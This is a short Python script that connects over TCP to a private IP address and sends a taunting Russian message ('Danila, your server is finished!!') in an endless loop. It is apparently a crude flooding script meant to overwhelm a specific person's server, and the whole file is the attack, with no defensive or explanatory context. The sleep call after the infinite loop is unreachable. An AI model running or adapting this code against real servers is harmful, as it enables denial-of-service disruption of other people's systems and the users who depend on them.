import random
import socket
import threading
import time

from config import CODE
from config import PORT

sock =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('172.17.129.135',PORT))

#message = "X" + str(random.randint(0,100000))
message = "ДАНИЛА ТВОЕМУ СЕРВЕРУ КОНЕЦ!!"

while True:
    sock.sendall(message.encode(CODE))

time.sleep(3600)
